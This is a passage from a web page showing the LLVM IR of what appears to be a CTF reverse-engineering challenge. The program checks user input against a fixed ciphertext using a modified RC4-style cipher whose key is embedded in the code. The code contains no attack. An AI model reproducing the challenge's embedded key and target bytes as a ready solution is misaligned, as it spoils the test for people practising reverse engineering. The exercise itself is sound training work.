class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;a.bc&#x27;</span><br><span class="line">source_filename = &quot;ab.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-i128:128-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">@stderr = external global ptr, align 8</span><br><span class="line">@.str = private unnamed_addr constant [15 x i8] c&quot;malloc failed\0A\00&quot;, align 1</span><br><span class="line">@.str.1 = private unnamed_addr constant [16 x i8] c&quot;realloc failed\0A\00&quot;, align 1</span><br><span class="line">@sub_138 = internal constant [10 x i8] c&quot;flag&#123;fake&#125;&quot;, align 1</span><br><span class="line">@sub_b361 = internal constant [23 x i8] c&quot;ab#_var1an&amp;_k3y_f0r_???&quot;, align 16</span><br><span class="line">@.str.2 = private unnamed_addr constant [30 x i8] c&quot;Incorrect! (length mismatch)\0A\00&quot;, align 1</span><br><span class="line">@sub_584c = internal constant [42 x i8] c&quot;\C2\F6\BF\A9\9A\BE$\DCh\0C\F4`\D7\FA\CA,X\CA8\08\89/@$]\87\97\92\A2[\FA\81\BAY\80p\B6d\82S\11]&quot;, align 16</span><br><span class="line">@.str.3 = private unnamed_addr constant [10 x i8] c&quot;Correct!\0A\00&quot;, align 1</span><br><span class="line">@.str.4 = private unnamed_addr constant [12 x i8] c&quot;Incorrect!\0A\00&quot;, align 1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i32 @main() #0 &#123;</span><br><span class="line">  %1 = alloca i32, align 4</span><br><span class="line">  %2 = alloca i64, align 8</span><br><span class="line">  %3 = alloca i64, align 8</span><br><span class="line">  %4 = alloca ptr, align 8</span><br><span class="line">  %5 = alloca i32, align 4</span><br><span class="line">  %6 = alloca ptr, align 8</span><br><span class="line">  %7 = alloca i64, align 8</span><br><span class="line">  %8 = alloca ptr, align 8</span><br><span class="line">  %9 = alloca [256 x i8], align 16</span><br><span class="line">  %10 = alloca ptr, align 8</span><br><span class="line">  store i32 0, ptr %1, align 4</span><br><span class="line">  store i64 1024, ptr %2, align 8</span><br><span class="line">  store i64 0, ptr %3, align 8</span><br><span class="line">  %11 = load i64, ptr %2, align 8</span><br><span class="line">  %12 = call noalias ptr @malloc(i64 noundef %11) #5</span><br><span class="line">  store ptr %12, ptr %4, align 8</span><br><span class="line">  %13 = load ptr, ptr %4, align 8</span><br><span class="line">  %14 = icmp ne ptr %13, null</span><br><span class="line">  br i1 %14, label %18, label %15</span><br><span class="line"></span><br><span class="line">15:                                               ; preds = %0</span><br><span class="line">  %16 = load ptr, ptr @stderr, align 8</span><br><span class="line">  %17 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %16, ptr noundef @.str)</span><br><span class="line">  store i32 1, ptr %1, align 4</span><br><span class="line">  br label %102</span><br><span class="line"></span><br><span class="line">18:                                               ; preds = %0</span><br><span class="line">  br label %19</span><br><span class="line"></span><br><span class="line">19:                                               ; preds = %40, %18</span><br><span class="line">  %20 = call i32 @getchar()</span><br><span class="line">  store i32 %20, ptr %5, align 4</span><br><span class="line">  %21 = icmp ne i32 %20, 10</span><br><span class="line">  br i1 %21, label %22, label %47</span><br><span class="line"></span><br><span class="line">22:                                               ; preds = %19</span><br><span class="line">  %23 = load i64, ptr %3, align 8</span><br><span class="line">  %24 = load i64, ptr %2, align 8</span><br><span class="line">  %25 = icmp eq i64 %23, %24</span><br><span class="line">  br i1 %25, label %26, label %40</span><br><span class="line"></span><br><span class="line">26:                                               ; preds = %22</span><br><span class="line">  %27 = load i64, ptr %2, align 8</span><br><span class="line">  %28 = mul i64 %27, 2</span><br><span class="line">  store i64 %28, ptr %2, align 8</span><br><span class="line">  %29 = load ptr, ptr %4, align 8</span><br><span class="line">  %30 = load i64, ptr %2, align 8</span><br><span class="line">  %31 = call ptr @realloc(ptr noundef %29, i64 noundef %30) #5</span><br><span class="line">  store ptr %31, ptr %6, align 8</span><br><span class="line">  %32 = load ptr, ptr %6, align 8</span><br><span class="line">  %33 = icmp ne ptr %32, null</span><br><span class="line">  br i1 %33, label %38, label %34</span><br><span class="line"></span><br><span class="line">34:                                               ; preds = %26</span><br><span class="line">  %35 = load ptr, ptr %4, align 8</span><br><span class="line">  call void @free(ptr noundef %35) #5</span><br><span class="line">  %36 = load ptr, ptr @stderr, align 8</span><br><span class="line">  %37 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %36, ptr noundef @.str.1)</span><br><span class="line">  store i32 1, ptr %1, align 4</span><br><span class="line">  br label %102</span><br><span class="line"></span><br><span class="line">38:                                               ; preds = %26</span><br><span class="line">  %39 = load ptr, ptr %6, align 8</span><br><span class="line">  store ptr %39, ptr %4, align 8</span><br><span class="line">  br label %40</span><br><span class="line"></span><br><span class="line">40:                                               ; preds = %38, %22</span><br><span class="line">  %41 = load i32, ptr %5, align 4</span><br><span class="line">  %42 = trunc i32 %41 to i8</span><br><span class="line">  %43 = load ptr, ptr %4, align 8</span><br><span class="line">  %44 = load i64, ptr %3, align 8</span><br><span class="line">  %45 = add i64 %44, 1</span><br><span class="line">  store i64 %45, ptr %3, align 8</span><br><span class="line">  %46 = getelementptr inbounds i8, ptr %43, i64 %44</span><br><span class="line">  store i8 %42, ptr %46, align 1</span><br><span class="line">  br label %19, !llvm.loop !6</span><br><span class="line"></span><br><span class="line">47:                                               ; preds = %19</span><br><span class="line">  %48 = load i64, ptr %3, align 8</span><br><span class="line">  %49 = add i64 10, %48</span><br><span class="line">  store i64 %49, ptr %7, align 8</span><br><span class="line">  %50 = load i64, ptr %7, align 8</span><br><span class="line">  %51 = call noalias ptr @malloc(i64 noundef %50) #5</span><br><span class="line">  store ptr %51, ptr %8, align 8</span><br><span class="line">  %52 = load ptr, ptr %8, align 8</span><br><span class="line">  %53 = icmp ne ptr %52, null</span><br><span class="line">  br i1 %53, label %58, label %54</span><br><span class="line"></span><br><span class="line">54:                                               ; preds = %47</span><br><span class="line">  %55 = load ptr, ptr %4, align 8</span><br><span class="line">  call void @free(ptr noundef %55) #5</span><br><span class="line">  %56 = load ptr, ptr @stderr, align 8</span><br><span class="line">  %57 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %56, ptr noundef @.str)</span><br><span class="line">  store i32 1, ptr %1, align 4</span><br><span class="line">  br label %102</span><br><span class="line"></span><br><span class="line">58:                                               ; preds = %47</span><br><span class="line">  %59 = load ptr, ptr %8, align 8</span><br><span class="line">  call void @llvm.memcpy.p0.p0.i64(ptr align 1 %59, ptr align 1 @sub_138, i64 10, i1 false)</span><br><span class="line">  %60 = load i64, ptr %3, align 8</span><br><span class="line">  %61 = icmp ugt i64 %60, 0</span><br><span class="line">  br i1 %61, label %62, label %67</span><br><span class="line"></span><br><span class="line">62:                                               ; preds = %58</span><br><span class="line">  %63 = load ptr, ptr %8, align 8</span><br><span class="line">  %64 = getelementptr inbounds i8, ptr %63, i64 10</span><br><span class="line">  %65 = load ptr, ptr %4, align 8</span><br><span class="line">  %66 = load i64, ptr %3, align 8</span><br><span class="line">  call void @llvm.memcpy.p0.p0.i64(ptr align 1 %64, ptr align 1 %65, i64 %66, i1 false)</span><br><span class="line">  br label %67</span><br><span class="line"></span><br><span class="line">67:                                               ; preds = %62, %58</span><br><span class="line">  %68 = getelementptr inbounds [256 x i8], ptr %9, i64 0, i64 0</span><br><span class="line">  call void @sub_2a4c(ptr noundef %68, ptr noundef @sub_b361, i64 noundef 23)</span><br><span class="line">  %69 = load i64, ptr %7, align 8</span><br><span class="line">  %70 = call noalias ptr @malloc(i64 noundef %69) #5</span><br><span class="line">  store ptr %70, ptr %10, align 8</span><br><span class="line">  %71 = load ptr, ptr %10, align 8</span><br><span class="line">  %72 = icmp ne ptr %71, null</span><br><span class="line">  br i1 %72, label %78, label %73</span><br><span class="line"></span><br><span class="line">73:                                               ; preds = %67</span><br><span class="line">  %74 = load ptr, ptr %4, align 8</span><br><span class="line">  call void @free(ptr noundef %74) #5</span><br><span class="line">  %75 = load ptr, ptr %8, align 8</span><br><span class="line">  call void @free(ptr noundef %75) #5</span><br><span class="line">  %76 = load ptr, ptr @stderr, align 8</span><br><span class="line">  %77 = call i32 (ptr, ptr, ...) @fprintf(ptr noundef %76, ptr noundef @.str)</span><br><span class="line">  store i32 1, ptr %1, align 4</span><br><span class="line">  br label %102</span><br><span class="line"></span><br><span class="line">78:                                               ; preds = %67</span><br><span class="line">  %79 = getelementptr inbounds [256 x i8], ptr %9, i64 0, i64 0</span><br><span class="line">  %80 = load ptr, ptr %8, align 8</span><br><span class="line">  %81 = load ptr, ptr %10, align 8</span><br><span class="line">  %82 = load i64, ptr %7, align 8</span><br><span class="line">  call void @sub_1a4c(ptr noundef %79, ptr noundef %80, ptr noundef %81, i64 noundef %82)</span><br><span class="line">  %83 = load i64, ptr %7, align 8</span><br><span class="line">  %84 = icmp ne i64 %83, 42</span><br><span class="line">  br i1 %84, label %85, label %90</span><br><span class="line"></span><br><span class="line">85:                                               ; preds = %78</span><br><span class="line">  %86 = call i32 (ptr, ...) @printf(ptr noundef @.str.2)</span><br><span class="line">  %87 = load ptr, ptr %4, align 8</span><br><span class="line">  call void @free(ptr noundef %87) #5</span><br><span class="line">  %88 = load ptr, ptr %8, align 8</span><br><span class="line">  call void @free(ptr noundef %88) #5</span><br><span class="line">  %89 = load ptr, ptr %10, align 8</span><br><span class="line">  call void @free(ptr noundef %89) #5</span><br><span class="line">  store i32 0, ptr %1, align 4</span><br><span class="line">  br label %102</span><br><span class="line"></span><br><span class="line">90:                                               ; preds = %78</span><br><span class="line">  %91 = load ptr, ptr %10, align 8</span><br><span class="line">  %92 = call i32 @memcmp(ptr noundef %91, ptr noundef @sub_584c, i64 noundef 42) #6</span><br><span class="line">  %93 = icmp eq i32 %92, 0</span><br><span class="line">  br i1 %93, label %94, label %96</span><br><span class="line"></span><br><span class="line">94:                                               ; preds = %90</span><br><span class="line">  %95 = call i32 (ptr, ...) @printf(ptr noundef @.str.3)</span><br><span class="line">  br label %98</span><br><span class="line"></span><br><span class="line">96:                                               ; preds = %90</span><br><span class="line">  %97 = call i32 (ptr, ...) @printf(ptr noundef @.str.4)</span><br><span class="line">  br label %98</span><br><span class="line"></span><br><span class="line">98:                                               ; preds = %96, %94</span><br><span class="line">  %99 = load ptr, ptr %4, align 8</span><br><span class="line">  call void @free(ptr noundef %99) #5</span><br><span class="line">  %100 = load ptr, ptr %8, align 8</span><br><span class="line">  call void @free(ptr noundef %100) #5</span><br><span class="line">  %101 = load ptr, ptr %10, align 8</span><br><span class="line">  call void @free(ptr noundef %101) #5</span><br><span class="line">  store i32 0, ptr %1, align 4</span><br><span class="line">  br label %102</span><br><span class="line"></span><br><span class="line">102:                                              ; preds = %98, %85, %73, %54, %34, %15</span><br><span class="line">  %103 = load i32, ptr %1, align 4</span><br><span class="line">  ret i32 %103</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare noalias ptr @malloc(i64 noundef) #1</span><br><span class="line"></span><br><span class="line">declare i32 @fprintf(ptr noundef, ptr noundef, ...) #2</span><br><span class="line"></span><br><span class="line">declare i32 @getchar() #2</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare ptr @realloc(ptr noundef, i64 noundef) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: nounwind</span><br><span class="line">declare void @free(ptr noundef) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define internal void @sub_2a4c(ptr noundef %0, ptr noundef %1, i64 noundef %2) #0 &#123;</span><br><span class="line">  %4 = alloca ptr, align 8</span><br><span class="line">  %5 = alloca ptr, align 8</span><br><span class="line">  %6 = alloca i64, align 8</span><br><span class="line">  %7 = alloca i32, align 4</span><br><span class="line">  %8 = alloca i8, align 1</span><br><span class="line">  %9 = alloca i32, align 4</span><br><span class="line">  %10 = alloca i8, align 1</span><br><span class="line">  %11 = alloca i8, align 1</span><br><span class="line">  store ptr %0, ptr %4, align 8</span><br><span class="line">  store ptr %1, ptr %5, align 8</span><br><span class="line">  store i64 %2, ptr %6, align 8</span><br><span class="line">  store i32 0, ptr %7, align 4</span><br><span class="line">  br label %12</span><br><span class="line"></span><br><span class="line">12:                                               ; preds = %22, %3</span><br><span class="line">  %13 = load i32, ptr %7, align 4</span><br><span class="line">  %14 = icmp slt i32 %13, 256</span><br><span class="line">  br i1 %14, label %15, label %25</span><br><span class="line"></span><br><span class="line">15:                                               ; preds = %12</span><br><span class="line">  %16 = load i32, ptr %7, align 4</span><br><span class="line">  %17 = trunc i32 %16 to i8</span><br><span class="line">  %18 = load ptr, ptr %4, align 8</span><br><span class="line">  %19 = load i32, ptr %7, align 4</span><br><span class="line">  %20 = sext i32 %19 to i64</span><br><span class="line">  %21 = getelementptr inbounds i8, ptr %18, i64 %20</span><br><span class="line">  store i8 %17, ptr %21, align 1</span><br><span class="line">  br label %22</span><br><span class="line"></span><br><span class="line">22:                                               ; preds = %15</span><br><span class="line">  %23 = load i32, ptr %7, align 4</span><br><span class="line">  %24 = add nsw i32 %23, 1</span><br><span class="line">  store i32 %24, ptr %7, align 4</span><br><span class="line">  br label %12, !llvm.loop !8</span><br><span class="line"></span><br><span class="line">25:                                               ; preds = %12</span><br><span class="line">  store i8 0, ptr %8, align 1</span><br><span class="line">  store i32 0, ptr %9, align 4</span><br><span class="line">  br label %26</span><br><span class="line"></span><br><span class="line">26:                                               ; preds = %78, %25</span><br><span class="line">  %27 = load i32, ptr %9, align 4</span><br><span class="line">  %28 = icmp slt i32 %27, 256</span><br><span class="line">  br i1 %28, label %29, label %81</span><br><span class="line"></span><br><span class="line">29:                                               ; preds = %26</span><br><span class="line">  %30 = load ptr, ptr %5, align 8</span><br><span class="line">  %31 = load i32, ptr %9, align 4</span><br><span class="line">  %32 = mul nsw i32 %31, 5</span><br><span class="line">  %33 = add nsw i32 %32, 3</span><br><span class="line">  %34 = sext i32 %33 to i64</span><br><span class="line">  %35 = load i64, ptr %6, align 8</span><br><span class="line">  %36 = urem i64 %34, %35</span><br><span class="line">  %37 = getelementptr inbounds i8, ptr %30, i64 %36</span><br><span class="line">  %38 = load i8, ptr %37, align 1</span><br><span class="line">  store i8 %38, ptr %10, align 1</span><br><span class="line">  %39 = load i8, ptr %8, align 1</span><br><span class="line">  %40 = zext i8 %39 to i32</span><br><span class="line">  %41 = load ptr, ptr %4, align 8</span><br><span class="line">  %42 = load i32, ptr %9, align 4</span><br><span class="line">  %43 = sext i32 %42 to i64</span><br><span class="line">  %44 = getelementptr inbounds i8, ptr %41, i64 %43</span><br><span class="line">  %45 = load i8, ptr %44, align 1</span><br><span class="line">  %46 = zext i8 %45 to i32</span><br><span class="line">  %47 = add nsw i32 %40, %46</span><br><span class="line">  %48 = load i8, ptr %10, align 1</span><br><span class="line">  %49 = zext i8 %48 to i32</span><br><span class="line">  %50 = add nsw i32 %47, %49</span><br><span class="line">  %51 = and i32 %50, 255</span><br><span class="line">  %52 = trunc i32 %51 to i8</span><br><span class="line">  store i8 %52, ptr %8, align 1</span><br><span class="line">  %53 = load ptr, ptr %4, align 8</span><br><span class="line">  %54 = load i32, ptr %9, align 4</span><br><span class="line">  %55 = sext i32 %54 to i64</span><br><span class="line">  %56 = getelementptr inbounds i8, ptr %53, i64 %55</span><br><span class="line">  %57 = load i8, ptr %56, align 1</span><br><span class="line">  store i8 %57, ptr %11, align 1</span><br><span class="line">  %58 = load ptr, ptr %4, align 8</span><br><span class="line">  %59 = load i8, ptr %8, align 1</span><br><span class="line">  %60 = zext i8 %59 to i64</span><br><span class="line">  %61 = getelementptr inbounds i8, ptr %58, i64 %60</span><br><span class="line">  %62 = load i8, ptr %61, align 1</span><br><span class="line">  %63 = load ptr, ptr %4, align 8</span><br><span class="line">  %64 = load i32, ptr %9, align 4</span><br><span class="line">  %65 = sext i32 %64 to i64</span><br><span class="line">  %66 = getelementptr inbounds i8, ptr %63, i64 %65</span><br><span class="line">  store i8 %62, ptr %66, align 1</span><br><span class="line">  %67 = load i8, ptr %11, align 1</span><br><span class="line">  %68 = load ptr, ptr %4, align 8</span><br><span class="line">  %69 = load i8, ptr %8, align 1</span><br><span class="line">  %70 = zext i8 %69 to i64</span><br><span class="line">  %71 = getelementptr inbounds i8, ptr %68, i64 %70</span><br><span class="line">  store i8 %67, ptr %71, align 1</span><br><span class="line">  %72 = load i8, ptr %8, align 1</span><br><span class="line">  %73 = zext i8 %72 to i32</span><br><span class="line">  %74 = load i32, ptr %9, align 4</span><br><span class="line">  %75 = add nsw i32 %73, %74</span><br><span class="line">  %76 = and i32 %75, 255</span><br><span class="line">  %77 = trunc i32 %76 to i8</span><br><span class="line">  store i8 %77, ptr %8, align 1</span><br><span class="line">  br label %78</span><br><span class="line"></span><br><span class="line">78:                                               ; preds = %29</span><br><span class="line">  %79 = load i32, ptr %9, align 4</span><br><span class="line">  %80 = add nsw i32 %79, 1</span><br><span class="line">  store i32 %80, ptr %9, align 4</span><br><span class="line">  br label %26, !llvm.loop !9</span><br><span class="line"></span><br><span class="line">81:                                               ; preds = %26</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define internal void @sub_1a4c(ptr noundef %0, ptr noundef %1, ptr noundef %2, i64 noundef %3) #0 &#123;</span><br><span class="line">  %5 = alloca ptr, align 8</span><br><span class="line">  %6 = alloca ptr, align 8</span><br><span class="line">  %7 = alloca ptr, align 8</span><br><span class="line">  %8 = alloca i64, align 8</span><br><span class="line">  %9 = alloca i8, align 1</span><br><span class="line">  %10 = alloca i8, align 1</span><br><span class="line">  %11 = alloca i64, align 8</span><br><span class="line">  %12 = alloca i8, align 1</span><br><span class="line">  %13 = alloca i8, align 1</span><br><span class="line">  %14 = alloca i8, align 1</span><br><span class="line">  store ptr %0, ptr %5, align 8</span><br><span class="line">  store ptr %1, ptr %6, align 8</span><br><span class="line">  store ptr %2, ptr %7, align 8</span><br><span class="line">  store i64 %3, ptr %8, align 8</span><br><span class="line">  store i8 0, ptr %9, align 1</span><br><span class="line">  store i8 0, ptr %10, align 1</span><br><span class="line">  store i64 0, ptr %11, align 8</span><br><span class="line">  br label %15</span><br><span class="line"></span><br><span class="line">15:                                               ; preds = %99, %4</span><br><span class="line">  %16 = load i64, ptr %11, align 8</span><br><span class="line">  %17 = load i64, ptr %8, align 8</span><br><span class="line">  %18 = icmp ult i64 %16, %17</span><br><span class="line">  br i1 %18, label %19, label %102</span><br><span class="line"></span><br><span class="line">19:                                               ; preds = %15</span><br><span class="line">  %20 = load i8, ptr %9, align 1</span><br><span class="line">  %21 = zext i8 %20 to i32</span><br><span class="line">  %22 = add nsw i32 %21, 1</span><br><span class="line">  %23 = and i32 %22, 255</span><br><span class="line">  %24 = trunc i32 %23 to i8</span><br><span class="line">  store i8 %24, ptr %9, align 1</span><br><span class="line">  %25 = load i8, ptr %10, align 1</span><br><span class="line">  %26 = zext i8 %25 to i32</span><br><span class="line">  %27 = load ptr, ptr %5, align 8</span><br><span class="line">  %28 = load i8, ptr %9, align 1</span><br><span class="line">  %29 = zext i8 %28 to i64</span><br><span class="line">  %30 = getelementptr inbounds i8, ptr %27, i64 %29</span><br><span class="line">  %31 = load i8, ptr %30, align 1</span><br><span class="line">  %32 = zext i8 %31 to i32</span><br><span class="line">  %33 = add nsw i32 %26, %32</span><br><span class="line">  %34 = load i8, ptr %9, align 1</span><br><span class="line">  %35 = zext i8 %34 to i32</span><br><span class="line">  %36 = add nsw i32 %33, %35</span><br><span class="line">  %37 = and i32 %36, 255</span><br><span class="line">  %38 = trunc i32 %37 to i8</span><br><span class="line">  store i8 %38, ptr %10, align 1</span><br><span class="line">  %39 = load ptr, ptr %5, align 8</span><br><span class="line">  %40 = load i8, ptr %9, align 1</span><br><span class="line">  %41 = zext i8 %40 to i64</span><br><span class="line">  %42 = getelementptr inbounds i8, ptr %39, i64 %41</span><br><span class="line">  %43 = load i8, ptr %42, align 1</span><br><span class="line">  store i8 %43, ptr %12, align 1</span><br><span class="line">  %44 = load ptr, ptr %5, align 8</span><br><span class="line">  %45 = load i8, ptr %10, align 1</span><br><span class="line">  %46 = zext i8 %45 to i64</span><br><span class="line">  %47 = getelementptr inbounds i8, ptr %44, i64 %46</span><br><span class="line">  %48 = load i8, ptr %47, align 1</span><br><span class="line">  %49 = load ptr, ptr %5, align 8</span><br><span class="line">  %50 = load i8, ptr %9, align 1</span><br><span class="line">  %51 = zext i8 %50 to i64</span><br><span class="line">  %52 = getelementptr inbounds i8, ptr %49, i64 %51</span><br><span class="line">  store i8 %48, ptr %52, align 1</span><br><span class="line">  %53 = load i8, ptr %12, align 1</span><br><span class="line">  %54 = load ptr, ptr %5, align 8</span><br><span class="line">  %55 = load i8, ptr %10, align 1</span><br><span class="line">  %56 = zext i8 %55 to i64</span><br><span class="line">  %57 = getelementptr inbounds i8, ptr %54, i64 %56</span><br><span class="line">  store i8 %53, ptr %57, align 1</span><br><span class="line">  %58 = load ptr, ptr %5, align 8</span><br><span class="line">  %59 = load ptr, ptr %5, align 8</span><br><span class="line">  %60 = load i8, ptr %9, align 1</span><br><span class="line">  %61 = zext i8 %60 to i64</span><br><span class="line">  %62 = getelementptr inbounds i8, ptr %59, i64 %61</span><br><span class="line">  %63 = load i8, ptr %62, align 1</span><br><span class="line">  %64 = zext i8 %63 to i32</span><br><span class="line">  %65 = load ptr, ptr %5, align 8</span><br><span class="line">  %66 = load i8, ptr %10, align 1</span><br><span class="line">  %67 = zext i8 %66 to i64</span><br><span class="line">  %68 = getelementptr inbounds i8, ptr %65, i64 %67</span><br><span class="line">  %69 = load i8, ptr %68, align 1</span><br><span class="line">  %70 = zext i8 %69 to i32</span><br><span class="line">  